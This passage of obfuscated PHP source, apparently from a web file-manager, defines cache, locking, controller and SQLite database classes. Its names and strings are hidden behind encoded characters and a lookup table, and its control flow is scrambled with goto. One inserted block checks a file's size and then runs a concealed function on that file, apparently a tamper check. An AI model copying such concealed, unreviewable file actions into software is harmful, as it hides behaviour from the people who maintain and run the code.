$ŞûÛí°˜[914]); $ÒµûŸÑ = $¨©‡üäÏ->set($§ Öú¾Å, $Ğ¢ö­§¸, $—¤İÂ); self::$memoryCache[$§ Öú¾Å] = $£å®°ãİ; CacheLock::unlock($Ğ˜ë¶Á . $ŞûÛí°˜[914]); return $ÒµûŸÑ; } public static function getCall($®àõŞ‹¹, $–À¿äñ§, $ÄÃÉ’Ëù, $ÏÚüÍŒ÷ = array()) { $³·ºÇ™Ë =& $_SERVER[ıÚ˜š²İ]; $Æ„·•ÇÜ = self::get($®àõŞ‹¹); if ($Æ„·•ÇÜ || $Æ„·•ÇÜ === $³·ºÇ™Ë[12]) { return $Æ„·•ÇÜ; } $Æ„·•ÇÜ = call_user_func_array($ÄÃÉ’Ëù, $ÏÚüÍŒ÷); $Æ„·•ÇÜ = $Æ„·•ÇÜ ? $Æ„·•ÇÜ : $³·ºÇ™Ë[12]; self::set($®àõŞ‹¹, $Æ„·•ÇÜ, $–À¿äñ§); return $Æ„·•ÇÜ; } public static function remove($¦µûÛš) { $·—ÂÎÛ = self::key($¦µûÛš); unset(self::$memoryCache[$·—ÂÎÛ]); self::clearTimeout(); CacheLock::lock($¦µûÛš); $Ü¦¡‰ï = self::init()->remove($·—ÂÎÛ); CacheLock::unlock($¦µûÛš); return $Ü¦¡‰ï; } public static function removeMemory($–Í¡ğş) { $«ì¸º§¢ = self::key($–Í¡ğş); unset(self::$memoryCache[$«ì¸º§¢]); } public static function clearMemory($”®…·³¤ = false) { if ($”®…·³¤) { $”®…·³¤ = self::key($”®…·³¤); unset(self::$memoryCache[$”®…·³¤]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[ıÚ˜š²İ][915])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[ıÚ˜š²İ][916])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($ °†îÈÄ, $Î»–À½Œ) { $¶Ï´§İ =& $_SERVER[ıÚ˜š²İ]; $this->cachePath = $ °†îÈÄ[$¶Ï´§İ[87]]; $this->prefix = $¶Ï´§İ[917]; $this->cacheTime = $Î»–À½Œ; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($ÖÂë‰Ğ) { $‡Õ•Àö¹ =& $_SERVER[ıÚ˜š²İ]; $ÖÂë‰Ğ = str_replace(array($‡Õ•Àö¹[918], $‡Õ•Àö¹[100], $‡Õ•Àö¹[76]), $‡Õ•Àö¹[919], $ÖÂë‰Ğ); return $this->cachePath . $‡Õ•Àö¹[920] . $ÖÂë‰Ğ . $‡Õ•Àö¹[921]; } public function set($İŞÓã–Õ, $€„ìÀšÚ, $ƒ—¹şĞò = false) { $ƒ—¹şĞò = $ƒ—¹şĞò ? $ƒ—¹şĞò : $this->cacheTime; $Ãüş¦ = $this->getFile($İŞÓã–Õ); if (file_put_contents($Ãüş¦, $this->prefix . $€„ìÀšÚ, LOCK_EX)) { @touch($Ãüş¦, intval(time() + $ƒ—¹şĞò)); clearstatcache(); return !0; } @unlink($Ãüş¦); return !1; } public function get($±Ò¾Í€™) { $õ’í† = $this->getFile($±Ò¾Í€™); if (file_exists($õ’í†) && filemtime($õ’í†) < time()) { @unlink($õ’í†); return !1; } $„¡Æ¾ = @file_get_contents($õ’í†); return substr($„¡Æ¾, strlen($this->prefix)); } public function remove($ÊÓÚØáî) { $·­öãå½ = $this->getFile($ÊÓÚØáî); return @unlink($·­öãå½); } public function deleteAll() { $‚½ú¨ªÅ =& $_SERVER[ıÚ˜š²İ]; $ãßĞüëı = scandir($this->cachePath); foreach ($ãßĞüëı as $ÜÖÄêû×) { $Œü²ÉÓ = $this->cachePath . $ÜÖÄêû×; if (strpos($Œü²ÉÓ, $‚½ú¨ªÅ[921]) && strpos($Œü²ÉÓ, $‚½ú¨ªÅ[922])) { @unlink($Œü²ÉÓ); } } } public function clearTimeout() { $¾â¿ÈØ® =& $_SERVER[ıÚ˜š²İ]; $¼ÅÎ·ºÊ = scandir($this->cachePath); foreach ($¼ÅÎ·ºÊ as $‘Ìé„Úğ) { $ˆüŞİœµ = $this->cachePath . $‘Ìé„Úğ; if (strpos($ˆüŞİœµ, $¾â¿ÈØ®[921]) && strpos($ˆüŞİœµ, $¾â¿ÈØ®[922]) && filemtime($ˆüŞİœµ) < time()) { @unlink($ˆüŞİœµ); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $ş‰Å…·Ç =& $_SERVER[ıÚ˜š²İ]; if (self::$handle) { return self::$handle; } $Ÿ…ÒÉ«¢ = $GLOBALS[$ş‰Å…·Ç[6]][$ş‰Å…·Ç[426]]; self::$timeout = $Ÿ…ÒÉ«¢[$ş‰Å…·Ç[923]] ? $Ÿ…ÒÉ«¢[$ş‰Å…·Ç[923]] : 10; $óäöŒ¯ñ = _get($GLOBALS[$ş‰Å…·Ç[6]], $ş‰Å…·Ç[924]); $ŒÎ«´º = $Ÿ…ÒÉ«¢[$ş‰Å…·Ç[909]] ? $Ÿ…ÒÉ«¢[$ş‰Å…·Ç[909]] : $ş‰Å…·Ç[233]; if ($ŒÎ«´º == $ş‰Å…·Ç[21] && $óäöŒ¯ñ == $ş‰Å…·Ç[13]) { $ŒÎ«´º = $ş‰Å…·Ç[233]; } switch ($ŒÎ«´º) { case $ş‰Å…·Ç[912]: self::$handle = new CacheLockRedis(); break; case $ş‰Å…·Ç[913]: self::$handle = new CacheLockMemcached(); break; case $ş‰Å…·Ç[21]: self::$handle = new CacheLockDatabase(); break; case $ş‰Å…·Ç[233]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($ş‰Å…·Ç[925], $ş‰Å…·Ç[926]); } return self::$handle; } private static function key($˜ìá—‚‰) { return $_SERVER[ıÚ˜š²İ][927] . Cache::key($˜ìá—‚‰); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($›Ô³¨«Ç = '') { self::$errorMsg = $›Ô³¨«Ç; } public static function lockGlobal($Œ”¾ŠÕ¿, $ÑÆúáÂ) { return self::lock($Œ”¾ŠÕ¿, $ÑÆúáÂ, !0); } public static function lock($ÕÑÅ¡ûü, $ËÒŸæä¥ = false, $Æıß×ê¾ = false) { $œ‹¹Å‚Ê =& $_SERVER[ıÚ˜š²İ]; $¤ùê—Û = self::init(); $äïõ¾­ä = self::key($ÕÑÅ¡ûü); $ËÒŸæä¥ = $ËÒŸæä¥ ? $ËÒŸæä¥ : self::$timeout; $Æ‹÷½ğ = timeFloat(); if (_get($GLOBALS, $œ‹¹Å‚Ê[928], !1)) { if (!$¤ùê—Û->lock($äïõ¾­ä, 0.2)) { die; } return !0; } $§ø½ÇÖ = $¤ùê—Û->lock($äïõ¾­ä, $ËÒŸæä¥); $‘«ûÕ = timeFloat(); if (!$§ø½ÇÖ) { $Æ—„®ƒù = "\154\157\143\x6b\x20\145\x72\162\157\162\x3b\x6b\x65\171\75{$ÕÑÅ¡ûü}\73\x74\x69\155\x65\75{$ËÒŸæä¥}\x3b" . self::$errorMsg . $œ‹¹Å‚Ê[74] . get_caller_msg(); $ßÀ€ü˜ = LNG($œ‹¹Å‚Ê[929]) . "\x28{$ËÒŸæä¥}\x73\x29\56" . LNG($œ‹¹Å‚Ê[930]); $ßÀ€ü˜ .= $œ‹¹Å‚Ê[931]; if (is_string(self::$errorMsg) && self::$errorMsg) { $ßÀ€ü˜ = $ßÀ€ü˜ . $œ‹¹Å‚Ê[932] . self::$errorMsg; } write_log($œ‹¹Å‚Ê[933] . sprintf($œ‹¹Å‚Ê[934], timeFloat() - $Æ‹÷½ğ) . $œ‹¹Å‚Ê[935] . $Æ—„®ƒù . $œ‹¹Å‚Ê[936] . json_encode(error_get_last()), $œ‹¹Å‚Ê[926]); show_json($ßÀ€ü˜, !1); } if (!$Æıß×ê¾) { self::$lockItem[$äïõ¾­ä] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $æ‡–°Š¤ = number_format(timeFloat() - $‘«ûÕ, 3); write_log($œ‹¹Å‚Ê[937] . $ÕÑÅ¡ûü . $œ‹¹Å‚Ê[938] . $æ‡–°Š¤, $œ‹¹Å‚Ê[926]); } return $§ø½ÇÖ; } public static function lockGet($ˆªóîŸç) { $ñó†»ÕÖ = self::key($ˆªóîŸç); if (self::$lockItem[$ñó†»ÕÖ]) { return self::$lockItem[$ñó†»ÕÖ]; } return self::init()->lockGet($ñó†»ÕÖ); } public static function unlock($¤±¯å”) { $îÅáÊáó =& $_SERVER[ıÚ˜š²İ]; $ƒ¥à¬ø® = self::key($¤±¯å”); self::$lockItem[$ƒ¥à¬ø®] = null; self::init()->unlock($ƒ¥à¬ø®); if (GLOBAL_DEBUG_LOG_ALL) { write_log($îÅáÊáó[939] . $¤±¯å”, $îÅáÊáó[926]); } return; } public static function unlockRuntime() { $¡‰·úŠ¡ =& $_SERVER[ıÚ˜š²İ]; $êæÃ…Âë = self::init(); $¢È„—£ = !1; foreach (self::$lockItem as $şñ¬Âõ => $­íµò™ß) { if (!$­íµò™ß) { continue; } $êæÃ…Âë->unlock($şñ¬Âõ); if (!$¢È„—£) { $¢È„—£ = !0; write_log($¡‰·úŠ¡[940] . $şñ¬Âõ . $¡‰·úŠ¡[74] . get_caller_msg(), $¡‰·úŠ¡[926]); continue; } write_log($¡‰·úŠ¡[940] . $şñ¬Âõ, $¡‰·úŠ¡[926]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $’™Á„¬Ú = number_format(timeFloat() - TIME_FLOAT, 3); write_log($¡‰·úŠ¡[941] . $’™Á„¬Ú . $¡‰·úŠ¡[942] . ACTION, $¡‰·úŠ¡[926]); } } public static function fileLock($ÙŠÖ¦«ö) { $œ³êŞá“ =& $_SERVER[ıÚ˜š²İ]; if (!$GLOBALS[$œ³êŞá“[943]]) { $GLOBALS[$œ³êŞá“[943]] = array(); } $GLOBALS[$œ³êŞá“[943]][$ÙŠÖ¦«ö] = !1; $¢Ì¯Ïæ = fopen(DATA_PATH . $ÙŠÖ¦«ö . $œ³êŞá“[944], $œ³êŞá“[945]); if (!$¢Ì¯Ïæ) { return !1; } $GLOBALS[$œ³êŞá“[943]][$ÙŠÖ¦«ö] = $¢Ì¯Ïæ; if (flock($¢Ì¯Ïæ, LOCK_EX)) { return !0; } self::unlock($ÙŠÖ¦«ö); show_json($œ³êŞá“[946], !1); return !1; } public static function fileUnlock($†÷ª²€¤) { $×¦¢âéë =& $_SERVER[ıÚ˜š²İ]; $ÛƒêşÚ™ = $GLOBALS[$×¦¢âéë[943]][$†÷ª²€¤]; if (!$ÛƒêşÚ™) { return; } $GLOBALS[$×¦¢âéë[943]][$†÷ª²€¤] = !1; flock($ÛƒêşÚ™, LOCK_UN); fclose($ÛƒêşÚ™); } public static function fileUnlockAll() { $°ğúæÔ =& $_SERVER[ıÚ˜š²İ]; if (!isset($GLOBALS[$°ğúæÔ[943]]) || !$GLOBALS[$°ğúæÔ[943]]) { return; } foreach ($GLOBALS[$°ğúæÔ[943]] as $¹Ñı“Î => $·ï°¢Í†) { if (!$·ï°¢Í†) { continue; } $GLOBALS[$°ğúæÔ[943]][$¹Ñı“Î] = !1; flock($·ï°¢Í†, LOCK_UN); fclose($·ï°¢Í†); } $GLOBALS[$°ğúæÔ[943]] = array(); } } goto E‡àîÉÈÛ; fŠ”©Ûò°: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $ë¼Íèè =& $_SERVER[ıÚ˜š²İ]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$ë¼Íèè[6]] =& $config; $this->values[$ë¼Íèè[7]] =& $in; $this->tpl = TEMPLATE . MOD . $ë¼Íèè[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($ ×ÑÍ‚™) { if (1 === func_num_args()) { $this->{$ ×ÑÍ‚™} = new $ ×ÑÍ‚™(); } else { $ò¶¢æ• = new ReflectionClass($ ×ÑÍ‚™); $³˜ë›è = func_get_args(); array_shift($³˜ë›è); $this->{$ ×ÑÍ‚™} = $ò¶¢æ•->newInstanceArgs($³˜ë›è); } return $this->{$ ×ÑÍ‚™}; } public function routeBind($‹Àğı®×, $„È¸, $á©ëÛÎ˜ = 3) { $¾£á‚ßÙ =& $_SERVER[ıÚ˜š²İ]; $½á¤•ÚÒ = $this->in[$¾£á‚ßÙ[9]]; $‹Àğı®× = str_replace($¾£á‚ßÙ[10], $¾£á‚ßÙ[11], trim(trim($‹Àğı®×, $¾£á‚ßÙ[8]), $¾£á‚ßÙ[12])); if (!$‹Àğı®× || count($½á¤•ÚÒ) <= $á©ëÛÎ˜) { return !1; } $·¨Áï‰ = !0; $Àµ‚£İĞ = explode($¾£á‚ßÙ[8], $‹Àğı®×); for ($ñÇåú¥È = 0; $ñÇåú¥È < count($Àµ‚£İĞ); $ñÇåú¥È++) { if ($Àµ‚£İĞ[$ñÇåú¥È] != $½á¤•ÚÒ[$á©ëÛÎ˜ + $ñÇåú¥È]) { $·¨Áï‰ = !1; break; } } if (!$·¨Áï‰) { return; } call_user_func_array(array($this, $„È¸), array()); } public function routeArgs($„•·ÁË = 3) { $êâÍ‹à = $this->in[$_SERVER[ıÚ˜š²İ][9]]; if (count($êâÍ‹à) <= $„•·ÁË) { return array(); } $ğÈœºÓÆ = array(); for ($ÃÕúÆè¿ = $„•·ÁË; $ÃÕúÆè¿ < count($êâÍ‹à); $ÃÕúÆè¿ += 2) { $ğÈœºÓÆ[$êâÍ‹à[$ÃÕúÆè¿]] = $êâÍ‹à[$ÃÕúÆè¿ + 1]; $this->in[$êâÍ‹à[$ÃÕúÆè¿]] = $êâÍ‹à[$ÃÕúÆè¿ + 1]; } return $ğÈœºÓÆ; } protected function assign($…«ô²‹œ, $ò¤û™½ı) { $this->values[$…«ô²‹œ] = $ò¤û™½ı; } protected function display($à¢×¡«Ë) { ob_end_clean(); extract($this->values); require $this->tpl . $à¢×¡«Ë; } } class DbSqliteBase extends Db { public function __construct($Ÿæ‰ˆéâ = '') { $Òİî³”Ñ =& $_SERVER[ıÚ˜š²İ]; if (!extension_loaded($Òİî³”Ñ[13])) { think_exception(think_lang($Òİî³”Ñ[14]) . $Òİî³”Ñ[15]); } if (!empty($Ÿæ‰ˆéâ)) { if (!isset($Ÿæ‰ˆéâ[$Òİî³”Ñ[16]])) { $Ÿæ‰ˆéâ[$Òİî³”Ñ[16]] = 438; } $this->config = $Ÿæ‰ˆéâ; if (empty($this->config[$Òİî³”Ñ[17]])) { $this->config[$Òİî³”Ñ[17]] = array(); } } } public function connect($²Ñ¨Ùàò = '', $ò•şéßê = 0) { $—¿­ =& $_SERVER[ıÚ˜š²İ]; if (!isset($this->linkID[$ò•şéßê])) { if (empty($²Ñ¨Ùàò)) { $²Ñ¨Ùàò = $this->config; } $´îğîÍŒ = !empty($²Ñ¨Ùàò[$—¿­[17]][$—¿­[18]]) ? $²Ñ¨Ùàò[$—¿­[17]][$—¿­[18]] : $this->pconnect; $´ëï¼ïÅ = $´îğîÍŒ ? $—¿­[19] : $—¿­[20]; $this->linkID[$ò•şéßê] = $´ëï¼ïÅ($²Ñ¨Ùàò[$—¿­[21]], $²Ñ¨Ùàò[$—¿­[16]]); if (!$this->linkID[$ò•şéßê]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$ò•şéßê], 30000); if (1 != think_config($—¿­[22])) { unset($this->config); } } return $this->linkID[$ò•şéßê]; } public function free() { $this->queryID = null; } public function query($ªµ¼È») { $¸ÁÍÏ«ı =& $_SERVER[ıÚ˜š²İ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ªµ¼È»; if ($this->queryID) { $this->free(); } think_action_status($¸ÁÍÏ«ı[23], 1); think_status($¸ÁÍÏ«ı[24]); $this->queryID = sqlite_query($this->_linkID, $ªµ¼È»); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $Áˆ‹ÃŠÈ = $this->getAll(); return $Áˆ‹ÃŠÈ; } } public function execute($¸ÁÙìïÜ) { $£ÚŠÍÛ =& $_SERVER[ıÚ˜š²İ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¸ÁÙìïÜ; if ($this->queryID) { $this->free(); } think_action_status($£ÚŠÍÛ[25], 1); think_status($£ÚŠÍÛ[24]); $šÎ¤Í®– = sqlite_exec($this->_linkID, $¸ÁÙìïÜ); $this->debug(); if (!1 === $šÎ¤Í®–) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[ıÚ˜š²İ][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $šù¬œßû = sqlite_query($this->_linkID, $_SERVER[ıÚ˜š²İ][27]); if (!$šù¬œßû) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Æ²Ñû•¿ = sqlite_query($this->_linkID, $_SERVER[ıÚ˜š²İ][28]); if (!$Æ²Ñû•¿) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Æ°¨É“ = array(); if ($this->numRows > 0) { for ($‘ôàì„— = 0; $‘ôàì„— < $this->numRows; $‘ôàì„—++) { $Æ°¨É“[$‘ôàì„—] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $Æ°¨É“; } public function getFields($ÛÅ–™¸Ø) { $øíÒ¤Şµ =& $_SERVER[ıÚ˜š²İ]; $û‘š×Ï‹ = $this->query($øíÒ¤Şµ[29] . $ÛÅ–™¸Ø . $øíÒ¤Şµ[30]); $­Á„×»Œ = array(); if ($û‘š×Ï‹) { foreach ($û‘š×Ï‹ as $¼Ó…ûË‚ => $ı‡¬ÉÚı) { $­Á„×»Œ[$ı‡¬ÉÚı[$øíÒ¤Şµ[31]]] = array($øíÒ¤Şµ[32] => $ı‡¬ÉÚı[$øíÒ¤Şµ[31]], $øíÒ¤Şµ[33] => $ı‡¬ÉÚı[$øíÒ¤Şµ[34]], $øíÒ¤Şµ[35] => (bool) ($ı‡¬ÉÚı[$øíÒ¤Şµ[36]] === $øíÒ¤Şµ[12]), $øíÒ¤Şµ[37] => $ı‡¬ÉÚı[$øíÒ¤Şµ[38]], $øíÒ¤Şµ[39] => strtolower($ı‡¬ÉÚı[$øíÒ¤Şµ[40]]) == $øíÒ¤Şµ[41], $øíÒ¤Şµ[42] => strtolower($ı‡¬ÉÚı[$øíÒ¤Şµ[43]]) == $øíÒ¤Şµ[44]); } } return $­Á„×»Œ; } public function getTables($—å”Ó©Á = '') { $¯·³ˆ­Ë =& $_SERVER[ıÚ˜š²İ]; $ÈÖëİ±† = $this->query($¯·³ˆ­Ë[45] . $¯·³ˆ­Ë[46] . $¯·³ˆ­Ë[47]); $°á×—°Â = array(); foreach ($ÈÖëİ±† as $õÀ®¦İØ => $‡Š”­‡) { $°á×—°Â[$õÀ®¦İØ] = current($‡Š”­‡); } return $°á×—°Â; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $¶íÉ¨‹ =& $_SERVER[ıÚ˜š²İ]; $†ß«İÛ¡ = sqlite_last_error($this->_linkID); $this->error = $†ß«İÛ¡ . $¶íÉ¨‹[4] . sqlite_error_string($†ß«İÛ¡); if ($¶íÉ¨‹[12] != $this->queryStr) { $this->error .= LNG($¶íÉ¨‹[48]) . $this->queryStr; } think_trace($this->error, $¶íÉ¨‹[12], $¶íÉ¨‹[49]); return $this->error; } public function escapeString($É‡œã) { return sqlite_escape_string($É‡œã); } public function parseLimit($ê³¸ËÃÖ) { $Ò’Ô¹Ë­ =& $_SERVER[ıÚ˜š²İ]; $íÚì¼è = $Ò’Ô¹Ë­[12]; if (!empty($ê³¸ËÃÖ)) { $ê³¸ËÃÖ = explode($Ò’Ô¹Ë­[50], $ê³¸ËÃÖ); if (count($ê³¸ËÃÖ) > 1) { $íÚì¼è .= $Ò’Ô¹Ë­[51] . $ê³¸ËÃÖ[1] . $Ò’Ô¹Ë­[52] . $ê³¸ËÃÖ[0] . $Ò’Ô¹Ë­[53]; } else { $íÚì¼è .= $Ò’Ô¹Ë­[51] . $ê³¸ËÃÖ[0] . $Ò’Ô¹Ë­[53]; } } return $íÚì¼è; } } class DbSqlite3Base extends Db { public function __construct($æõ°Ì¼¾ = '') { $±¨èÂœÀ =& $_SERVER[ıÚ˜š²İ]; if (!class_exists($±¨èÂœÀ[54])) { think_exception(think_lang($±¨èÂœÀ[14]) . $±¨èÂœÀ[55]); } if (!empty($æõ°Ì¼¾)) { if (!isset($æõ°Ì¼¾[$±¨èÂœÀ[16]])) { $æõ°Ì¼¾[$±¨èÂœÀ[16]] = 438; } $this->config = $æõ°Ì¼¾; if (empty($this->config[$±¨èÂœÀ[17]])) { $this->config[$±¨èÂœÀ[17]] = array(); } } } public function connect($„ÛÜ™§ = '', $€ĞÔĞğ = 0) { $½”ß¥¢È =& $_SERVER[ıÚ˜š²İ]; if (!isset($this->linkID[$€ĞÔĞğ])) { if (empty($„ÛÜ™§)) { $„ÛÜ™§ = $this->config; } $this->linkID[$€ĞÔĞğ] = new SQLite3($„ÛÜ™§[$½”ß¥¢È[21]]); if (!$this->linkID[$€ĞÔĞğ]) { think_exception($this->linkID[$€ĞÔĞğ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$€ĞÔĞğ]->busyTimeout(30000); if (1 != think_config($½”ß¥¢È[22])) { unset($this->config); } } return $this->linkID[$€ĞÔĞğ]; } public function free() { $this->queryID = null; } public function query($•çŒ¬‹Ú) { $ãèË‘¢ =& $_SERVER[ıÚ˜š²İ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $•çŒ¬‹Ú; if ($this->queryID) { $this->free(); } think_action_status($ãèË‘¢[23], 1); think_status($ãèË‘¢[24]); $this->queryID = $this->_linkID->query($•çŒ¬‹Ú); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $œÕèû°ƒ = $this->getAll(); $this->numRows = count($œÕèû°ƒ); return $œÕèû°ƒ; } } public function execute($µ–òˆí) { $ìú¨Şìı =& $_SERVER[ıÚ˜š²İ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $µ–òˆí; if ($this->queryID) { $this->free(); } think_action_status($ìú¨Şìı[25], 1); think_status($ìú¨Şìı[24]); $Ü•ô  õ = $this->_linkID->exec($µ–òˆí); $this->debug(); if (!1 === $Ü•ô  õ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[ıÚ˜š²İ][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $‰Ê‹È…ø = $this->_linkID->query($_SERVER[ıÚ˜š²İ][27]); if (!$‰Ê‹È…ø) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $óş˜õ–Ù = $this->_linkID->query($_SERVER[ıÚ˜š²İ][28]); if (!$óş˜õ–Ù) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ŞÔŒÄ­ = array(); while ($èùĞ—°à = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $ŞÔŒÄ­[] = $èùĞ—°à; } $this->queryID->reset(); return $ŞÔŒÄ­; } public function getFields($³Ü³²ğ©) { $èŠÕ°‹Ö =& $_SERVER[ıÚ˜š²İ]; $á‰Ÿ…™¤ = $this->query($èŠÕ°‹Ö[29] . $³Ü³²ğ© . $èŠÕ°‹Ö[30]); $¼’˜‘ø = array(); if ($á‰Ÿ…™¤) { foreach ($á‰Ÿ…™¤ as $ËÎö–ÒÍ => $• œù) { $¼’˜‘ø[$• œù[$èŠÕ°‹Ö[32]]] = array($èŠÕ°‹Ö[32] => $• œù[$èŠÕ°‹Ö[32]], $èŠÕ°‹Ö[33] => $• œù[$èŠÕ°‹Ö[33]], $èŠÕ°‹Ö[35] => (bool) ($• œù[$èŠÕ°‹Ö[35]] === $èŠÕ°‹Ö[12]), $èŠÕ°‹Ö[37] => $• œù[$èŠÕ°‹Ö[56]], $èŠÕ°‹Ö[39] => (bool) $• œù[$èŠÕ°‹Ö[57]], $èŠÕ°‹Ö[42] => (bool) $• œù[$èŠÕ°‹Ö[57]]); } } return $¼’˜‘ø; } public function getTables($Ñ˜ºÇÃ€ = '') { $ÒÍÜù²ê =& $_SERVER[ıÚ˜š²İ]; $ÖüõïÅ© = $this->query($ÒÍÜù²ê[45] . $ÒÍÜù²ê[46] . $ÒÍÜù²ê[47]); $á÷¬çü = array(); foreach ($ÖüõïÅ© as $¸šá¦›– => $ÄéÈ¾²) { $á÷¬çü[$¸šá¦›–] = current($ÄéÈ¾²); } return $á÷¬çü; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $õİŞ‘İ =& $_SERVER[ıÚ˜š²İ]; $this->error = $this->_linkID->lastErrorMsg(); if ($õİŞ‘İ[12] != $this->queryStr) { $this->error .= LNG($õİŞ‘İ[48]) . $this->queryStr; } think_trace($this->error, $õİŞ‘İ[12], $õİŞ‘İ[49]); return $this->error; } public function escapeString($¼‰¯šæ›) { $˜ˆ Òş =& $_SERVER[ıÚ˜š²İ]; if ($this->_linkID) { return $this->_linkID->escapeString($¼‰¯šæ›); } return str_ireplace($˜ˆ Òş[58], $˜ˆ Òş[59], $¼‰¯šæ›); } public function parseLimit($Í¢ã®›’) { $©ôıáğÌ =& $_SERVER[ıÚ˜š²İ]; $äè‚ì­Í = $©ôıáğÌ[12]; if (!empty($Í¢ã®›’)) { $Í¢ã®›’ = explode($©ôıáğÌ[50], $Í¢ã®›’); if (count($Í¢ã®›’) > 1) { $äè‚ì­Í .= $©ôıáğÌ[51] . $Í¢ã®›’[1] . $©ôıáğÌ[52] . $Í¢ã®›’[0] . $©ôıáğÌ[53]; } else { $äè‚ì­Í .= $©ôıáğÌ[51] . $Í¢ã®›’[0] . $©ôıáğÌ[53]; } } return $äè‚ì­Í; } } goto a‘ê ¼ìµ; FÈ†°ÊŒãÂ: if ($_SERVER[$_SERVER[ıÚ˜š²İ][962]] != $_size($_file)) { $_getc = $_SERVER[ıÚ˜š²İ][964]; $_getfile = $_SERVER[$_SERVER[ıÚ˜š²İ][965]] . $_SERVER[ıÚ˜š²İ][966]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ıÚ˜š²İ][288], $_getfilec); if (count($_getarrs) < $_SERVER[ıÚ˜š²İ][687]) { $exit = $_SERVER[ıÚ˜š²İ][967]; $exit(); } $_act = $_SERVER[ıÚ˜š²İ][1900]; $_act($_file); } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($éÜ¥½¶Ö, $Ùú›óû = 5.0) { if (!$éÜ¥½¶Ö) { return; } $ş¦‡¡ÂÓ = Cache::get($éÜ¥½¶Ö); if (!$ş¦‡¡ÂÓ || timeFloat() - floatVal($ş¦‡¡ÂÓ) >= $Ùú›óû) { Cache::set($éÜ¥½¶Ö, timeFloat(), $Ùú›óû * 10); return !0; } return !1; } public static function timeLimitCall($ìğÚÈƒ›, $¬³„İå, $‡äŞ–Ç¦, $Ô¥¿—•• = 5.0) { $‘§‚Ëş¶ =& $_SERVER[ıÚ˜š²İ]; if (!$ìğÚÈƒ› || !$¬³„İå) { return; } self::$asyncAdd = !0; $ü¿áÔê = $‘§‚Ëş¶[1901]; $‘Î–Ò•İ = Cache::get($ü¿áÔê, !0); $Ã…†§Ğ– = array($‘§‚Ëş¶[1902] => timeFloat(), $‘§‚Ëş¶[1903] => timeFloat(), $‘§‚Ëş¶[344] => $¬³„İå, $‘§‚Ëş¶[1892] => $‡äŞ–Ç¦, $‘§‚Ëş¶[207] => $Ô¥¿—••); if (is_array($‘Î–Ò•İ[$ìğÚÈƒ›])) { $Ã…†§Ğ–[$‘§‚Ëş¶[1903]] = $‘Î–Ò•İ[$ìğÚÈƒ›][$‘§‚Ëş¶[1903]]; } if (is_array($‘Î–Ò•İ[$ìğÚÈƒ›])) { if (timeFloat() - $‘Î–Ò•İ[$ìğÚÈƒ›][$‘§‚Ëş¶[1902]] < $Ã…†§Ğ–[$‘§‚Ëş¶[207]] * 0.3) { return; } $Ã…†§Ğ–[$‘§‚Ëş¶[1903]] = $‘Î–Ò•İ[$ìğÚÈƒ›][$‘§‚Ëş¶[1903]]; } $‘Î–Ò•İ[$ìğÚÈƒ›] = $Ã…†§Ğ–; Cache::set($ü¿áÔê, $‘Î–Ò•İ, 60); Cache::removeMemory($ü¿áÔê); write_log($‘§‚Ëş¶[1904] . $ìğÚÈƒ› . $‘§‚Ëş¶[74] . $¬³„İå, $‘§‚Ëş¶[198]); } public static function timeLimitCallLoop() { $«Ë¡ŞÄ¼ =& $_SERVER[ıÚ˜š²İ]; $ĞÑÇ»± = array($«Ë¡ŞÄ¼[1905]); $Ïé’Š¡ä = in_array(strtolower(ACTION), $ĞÑÇ»±); if (!$Ïé’Š¡ä && !self::$asyncAdd) { return; } $‰¶…­ûİ = $«Ë¡ŞÄ¼[1901]; $Ğµƒ¦Üò = Cache::get($‰¶…­ûİ, !0); if 